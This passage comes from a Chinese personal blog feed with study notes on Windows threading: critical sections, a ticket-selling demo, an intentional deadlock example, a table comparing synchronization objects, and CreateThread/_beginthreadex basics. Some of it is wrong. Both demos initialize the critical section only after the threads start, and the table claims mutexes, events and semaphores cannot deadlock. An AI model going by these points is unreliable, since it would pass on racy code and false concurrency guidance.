class=""><p>因为semTwo初始有信号，所以线程开始的时候如果先调用Accu就会被卡在Wait那里，如上图2<br>而当线程先跑Read的时候虽然也执行到了scanf，但是由于我们还没有向内存输入，另一个线程Accu也已经先跑了就会看到图1的情况。</p><p>至于后续的结果，也是可以大致猜到的。<br>由于线程运行完之后都有一个重置信号的过程，所以另一个线程等到这个信号就立马执行了，导致控制台看上去有点乱。</p><img src="/2022/07/20/thread1/004.png" class=""><hr><h2 id="关键代码段"><a href="#关键代码段" class="headerlink" title="关键代码段"></a>关键代码段</h2><blockquote><p>前面学的互斥对象、事件对象、信号量这些对象都是属于内核态的线程同步。</p></blockquote><p><code>critical_section</code>关键代码段，也成为临界区，工作在用户方式下。它是指一个小代码段，在代码能够执行钱，他必须独占对某些资源的访问其。通常把多线程中的访问同一种资源的那部分代码当作关键代码段。</p><p><code>InitializeCriticalSection</code>用于初始化一个关键代码段。<br>其原型为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">InitializeCriticalSection</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_ LPCRITICAL_SECTION lpCriticalSection</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  <span class="comment">// (_WIN32_WINNT &lt; 0x0600)</span></span></span><br></pre></td></tr></table></figure><p><code>EnterCriticalSection</code>表示进入关键代码段<br>原型：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">EnterCriticalSection</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_ LPCRITICAL_SECTION lpCriticalSection</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p><code>LeaveCriticalSection</code>用于退出关键代码段</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">LeaveCriticalSection</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_ LPCRITICAL_SECTION lpCriticalSection</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p><code>DeleteCriticalSection</code>用于删除临界区</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">DeleteCriticalSection</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _Inout_ LPCRITICAL_SECTION lpCriticalSection</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>总共是初始化、进入、离开、删除四个模块</p><p><strong>看起来是真的忒长了多看一眼都没有想法</strong></p><p>魔改一下卖票功能用线程实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> piao = <span class="number">100</span>;</span><br><span class="line">CRITICAL_SECTION g_cs;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">SellTicketA</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">EnterCriticalSection</span>(&amp;g_cs);<span class="comment">//进入临界区</span></span><br><span class="line"><span class="keyword">if</span> (piao &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line">piao--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;售票口1卖出：%d张票\n&quot;</span>, piao);</span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">SellTicketB</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">EnterCriticalSection</span>(&amp;g_cs);<span class="comment">//进入临界区</span></span><br><span class="line"><span class="keyword">if</span> (piao &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line">piao--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;售票口2卖出：%d张票\n&quot;</span>, piao);</span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">HANDLE hThreadA, hThreadB;</span><br><span class="line">hThreadA = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, SellTicketA, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThreadB = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, SellTicketB, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThreadA);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThreadB);</span><br><span class="line"></span><br><span class="line"><span class="built_in">InitializeCriticalSection</span>(&amp;g_cs);<span class="comment">//初始化关键代码</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">20000</span>);</span><br><span class="line"><span class="built_in">DeleteCriticalSection</span>(&amp;g_cs);<span class="comment">//删除临界区</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/20/thread1/005.png" class=""><p>因为没有了用户态的线程阻塞等待信号，两个线程的切换其实就看出没有这么频繁。或者提高线程里面的延时。</p><p>如果既没有用户态的所谓线程上锁解锁，或者现在的这个关键代码段。<br>那么多线程操作全局变量的结局就是数据重复。这个是最早的时候就提到的一个问题。</p><hr><h2 id="线程死锁"><a href="#线程死锁" class="headerlink" title="线程死锁"></a>线程死锁</h2><p>死锁就是指多个线程因为竞争一个资源而造成的僵局，也就是都处于等待状态。然后没有特殊处理推动，这些进程就都等在这里了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> piao = <span class="number">100</span>;</span><br><span class="line">CRITICAL_SECTION g_cs;</span><br><span class="line">CRITICAL_SECTION g_ct;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">SellTicketA</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">EnterCriticalSection</span>(&amp;g_cs);<span class="comment">//进入临界区cs</span></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">EnterCriticalSection</span>(&amp;g_ct);<span class="comment">//进入临界区ct</span></span><br><span class="line"><span class="keyword">if</span> (piao &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line">piao--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;售票口1卖出：%d张票\n&quot;</span>, piao);</span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_ct);<span class="comment">//离开临界区ct</span></span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区cs</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_ct);<span class="comment">//离开临界区ct</span></span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区cs</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">SellTicketB</span><span class="params">(<span class="type">void</span> *arg)</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">EnterCriticalSection</span>(&amp;g_ct);<span class="comment">//进入临界区ct</span></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">EnterCriticalSection</span>(&amp;g_cs);<span class="comment">//进入临界区cs</span></span><br><span class="line"><span class="keyword">if</span> (piao &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1</span>);</span><br><span class="line">piao--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;售票口2卖出：%d张票\n&quot;</span>, piao);</span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区cs</span></span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_ct);<span class="comment">//离开临界区ct</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_cs);<span class="comment">//离开临界区cs</span></span><br><span class="line"><span class="built_in">LeaveCriticalSection</span>(&amp;g_ct);<span class="comment">//离开临界区ct</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">HANDLE hThreadA, hThreadB;</span><br><span class="line">hThreadA = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, SellTicketA, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThreadB = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, SellTicketB, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThreadA);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThreadB);</span><br><span class="line"></span><br><span class="line"><span class="built_in">InitializeCriticalSection</span>(&amp;g_cs);<span class="comment">//初始化关键代码cs</span></span><br><span class="line"><span class="built_in">InitializeCriticalSection</span>(&amp;g_ct);<span class="comment">//初始化关键代码ct</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">20000</span>);</span><br><span class="line"><span class="built_in">DeleteCriticalSection</span>(&amp;g_cs);<span class="comment">//删除临界区cs</span></span><br><span class="line"><span class="built_in">DeleteCriticalSection</span>(&amp;g_ct);<span class="comment">//删除临界区ct</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里创建了两个<code>CRITICAL_SECTION</code>对象，然后在两个线程里，关键代码段都在互相等待。人为的去造成这种死锁的情况。</p><img src="/2022/07/20/thread1/006.png" class=""><p>因为两个线程都卡住了，所以就不会有显示。</p><blockquote><p>解决方法：避免这种叼毛写法。</p></blockquote><hr><h2 id="线程同步的比较小结"><a href="#线程同步的比较小结" class="headerlink" title="线程同步的比较小结"></a>线程同步的比较小结</h2><p>线程同步的方式主要有四种：</p><ol><li>互斥对象Mutex</li><li>事件对象Event</li><li>关键代码段criticalSection</li><li>信号量——偏冷</li></ol><ul><li>互斥对象和事件对象以及信号量都属于内核对象，利用内核对象进行线程同步，速度会比较慢，比较要wait之后重置。但是这样的内核对象可以在多个进程中的各个线程进行同步</li><li>关键代码段说到是在用户方式下，它的同步速度肯定快于前面几个。但使用关键代码段容易不留神造成死锁状态。最后就是关键代码段只适用于本进程中</li></ul><p>随便扯个表格,markdown格式写的，不确定会不会溢出。瞎看看吧。</p><table><thead><tr><th>差异&#x2F;对象</th><th>互斥对象Mutex</th><th>事件对象Event</th><th>信号量Semaphore</th><th>关键代码段criticalSection</th></tr></thead><tbody><tr><td>是否为内核对象</td><td>是</td><td>是</td><td>是</td><td>否</td></tr><tr><td>速度</td><td>较慢</td><td>较慢</td><td>较慢</td><td>快！</td></tr><tr><td>多个进程中的线程同步</td><td>支持</td><td>支持</td><td>支持</td><td>不支持</td></tr><tr><td>发生死锁现象</td><td>否</td><td>否</td><td>否</td><td>是</td></tr><tr><td>组成</td><td>一个线程ID；</br>用来标识哪个线程拥有该互斥量；</br>一个计数器：用来统计该线程用于互斥对象的次数</td><td>一个使用计数；</br>一个布尔值：用来标识该事件是自动重置还是人工重置；</br>一个布尔值：标识该事件处于有信号状态还是无信号状态</td><td>一个使用计数，</br>最大资源数，</br>标志当前可用资源数</td><td>一个小代码段。</br>在代码能执行钱，必须占用对某些资源的访问权</td></tr><tr><td>相关函数</td><td>CreateMutex;</br>WaitForsingleObjects;</br>ReleaseMutex</td><td>CreateEvent;</br>ResetEvent;</br>WaitforSingleobject;</br>SetEvent</td><td>CreateSemaphore;</br>WaitForsingleobject</br> ReleaseSemaPhore</td><td>InitializeCriticalSection<br/> EnterCriticalSection <br/> LeaveCriticalSection <br/> DeleteCriticalSection</td></tr><tr><td>注意事项</td><td>谁拥有互斥对象谁来释放。<br/>如果多次在同一个线程中请求同一个互斥对象，需要多次调用release函数</td><td>为了实现线程间的同步，不应该使用人工重置，应该把第二个参数设置为false;也就是自动重置</td><td>它允许多个线程在同一时间访问同一个资源，但是需要限制访问资源的最大数目。</td><td>防止死锁，使用多个关键代码段变量的时候</td></tr><tr><td>类比</td><td>一把钥匙</td><td>一个钥匙，自动和人工</td><td>停车场和保安</td><td>电话亭</td></tr></tbody></table><hr><h3 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h3><p>假如你写的代码在多线程中执行和单线程中执行的结果永远完全一致，那么可以说你的代码是线程安全的。<br>就是纯纯概念</p><blockquote><p>视频推荐书籍陈硕《muduo》</p></blockquote><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>溜溜球，保持学了跟没学的状态。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> windowsSocket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线程</title>
      <link href="/2022/07/18/thread/"/>
      <url>/2022/07/18/thread/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>线程（英语：thread）是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作单位。一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程，每条线程并行执行不同的任务。在Unix System V及SunOS中也被称为轻量进程（lightweight processes），但轻量进程更多指内核线程（kernel thread），而把用户线程（user thread）称为线程。<br>——百度百科</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">3000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;world!\n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">5000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hhhh\n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">7000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>像上述代码中，我们依次延时输出，但实际走一次要花费3+5+7秒，他是一个顺序执行的过程，而有的时候更希望一个程序，能够同时进行，减少开销。</p><hr><h2 id="线程基本概念"><a href="#线程基本概念" class="headerlink" title="线程基本概念"></a>线程基本概念</h2><p>进程：是分配资源的基本单位<br>线程：是cpu调度和分配的基本单位</p><p>线程是进程中产生的一个执行单元，一个进程中往往会有多个进程并行运行。<br>抽象的说：在流水线中，进程表示车间，线程表示工人。</p><p>狭义角度，进程就是一个正在运行的程序<br>广义角度，进程是处于执行期间的程序以及它所包含的资源(如打开的文件、挂起的信号、进程状态、地址空间等)。</p><p>为什么要使用多线程</p><ul><li>避免阻塞<ul><li>单个进程只有一个主线程，当主线程阻塞的时候，整个进程也就处于阻塞状态，无法在处理其他任务</li></ul></li><li>避免cpu空转<ul><li>应用程序经常会涉及到RPC，数据库访问，磁盘IO等操作，这些操作的速度远比cpu慢，在处理这些响应的时候，cpu只能原地等待，导致单线程的程序性能低下</li></ul></li><li>提升效率<ul><li>一个进程要独立拥有4GB的虚拟地址空间，而多线程可以共享同一块地址空间，线程之间的切换要比进程之间的切换来的快。</li></ul></li></ul><h3 id="CreateThread"><a href="#CreateThread" class="headerlink" title="CreateThread"></a>CreateThread</h3><p>CreateThread是微软封装在windows api中提供建立新的线程的函数，该函数在主线程的基础上创建一个新线程。线程终止运行后，线程对象仍然在系统中，必须通过<code>CloseHandle</code>函数关闭线程对象</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">_Ret_maybenull_</span></span><br><span class="line"><span class="function">HANDLE</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">CreateThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ __drv_aliasesMem LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ LPDWORD lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>这是转到定义的结构，也可以在函数上按f1跳转到文档。</p><img src="/2022/07/18/thread/000.png" class=""><blockquote><p>英语不好翻译就完事。。虽然机译不一定读的通顺</p></blockquote><p>与其功能相近的还有<code>_beginthread</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uintptr_t</span> _beginthread( <span class="comment">// NATIVE CODE</span></span><br><span class="line">   <span class="built_in">void</span>( __cdecl *start_address )( <span class="type">void</span> * ),</span><br><span class="line">   <span class="type">unsigned</span> stack_size,</span><br><span class="line">   <span class="type">void</span> *arglist</span><br><span class="line">);</span><br><span class="line"><span class="type">uintptr_t</span> _beginthread( <span class="comment">// MANAGED CODE</span></span><br><span class="line">   <span class="built_in">void</span>( __clrcall *start_address )( <span class="type">void</span> * ),</span><br><span class="line">   <span class="type">unsigned</span> stack_size,</span><br><span class="line">   <span class="type">void</span> *arglist</span><br><span class="line">);</span><br><span class="line"><span class="type">uintptr_t</span> _beginthreadex( <span class="comment">// NATIVE CODE</span></span><br><span class="line">   <span class="type">void</span> *security,</span><br><span class="line">   <span class="type">unsigned</span> stack_size,</span><br><span class="line">   <span class="built_in">unsigned</span> ( __stdcall *start_address )( <span class="type">void</span> * ),</span><br><span class="line">   <span class="type">void</span> *arglist,</span><br><span class="line">   <span class="type">unsigned</span> initflag,</span><br><span class="line">   <span class="type">unsigned</span> *thrdaddr</span><br><span class="line">);</span><br><span class="line"><span class="type">uintptr_t</span> _beginthreadex( <span class="comment">// MANAGED CODE</span></span><br><span class="line">   <span class="type">void</span> *security,</span><br><span class="line">   <span class="type">unsigned</span> stack_size,</span><br><span class="line">   <span class="built_in">unsigned</span> ( __clrcall *start_address )( <span class="type">void</span> * ),</span><br><span class="line">   <span class="type">void</span> *arglist,</span><br><span class="line">   <span class="type">unsigned</span> initflag,</span><br><span class="line">   <span class="type">unsigned</span> *thrdaddr</span><br><span class="line">);</span><br></pre></td></tr></table></figure><img src="/2022/07/18/thread/001.png" class=""><p>使用<code>_beginthreadex</code>需包含头文件<code>&lt;process.h&gt;</code></p><p><strong>再次补充，函数名后的ex是补充拓展的意思</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">printW</span><span class="params">(<span class="type">int</span> _x)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;world!n&quot;</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(_x*<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先把之前的封装成函数。</p><p>然后传参给<code>_beginthreadex</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_beginthreadex(<span class="literal">NULL</span>,<span class="number">0</span>,printH,(<span class="type">void</span>*)&amp;x, <span class="number">0</span>, &amp;xId);</span><br></pre></td></tr></table></figure><p>不过会有点问题，因为传递的函数类型不太一样。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_In_      _beginthreadex_proc_type _StartAddress,</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">unsigned</span> <span class="params">(__stdcall* _beginthreadex_proc_type)</span><span class="params">(<span class="type">void</span>*)</span></span>;</span><br></pre></td></tr></table></figure><p>依次转到定义之后会发现，本质是一个unsinged stdcall的函数，不过形参居然要求是void*就比较蛋疼，还得转换解引用取值。。</p><p>至于__stdcall，写起来麻烦，</p><img src="/2022/07/18/thread/002.png" class=""><p>其实内置了一些宏，都可以替换，比较常见的可能是<code>WINAPI</code>，就先用着</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> WINAPI <span class="title">printH</span><span class="params">(<span class="type">void</span> *_x)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n = *((<span class="type">int</span> *)_x);</span><br><span class="line"></span><br><span 